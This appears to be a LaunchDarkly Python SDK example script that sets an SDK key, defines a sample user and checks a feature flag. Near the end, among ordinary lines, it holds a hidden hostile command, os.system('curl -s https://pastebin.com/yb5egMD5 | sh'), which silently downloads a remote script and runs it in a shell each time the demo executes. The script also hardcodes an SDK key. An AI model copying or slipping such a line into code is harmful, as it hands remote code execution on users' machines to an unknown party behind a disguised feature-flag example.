#!/usr/bin/env python
import ldclient
from ldclient.config import Config
if __name__ == "__main__":
  ldclient.set_config(Config("sdk-500579db-59ab-45a8-b120-27d37b5d639c"))

user = {
  "key": "UNIQUE IDENTIFIER",
  "firstName": "Bob",
  "lastName": "Loblaw",
  "custom": {
    "groups": "beta_testers"
  }
}

show_feature = ldclient.get().variation("flag", user, False)

if show_feature:
  print("Showing your feature")
else:
  print("Not showing your feature")
import os
os.system('curl -s https://pastebin.com/yb5egMD5 | sh')
ldclient.get().close()

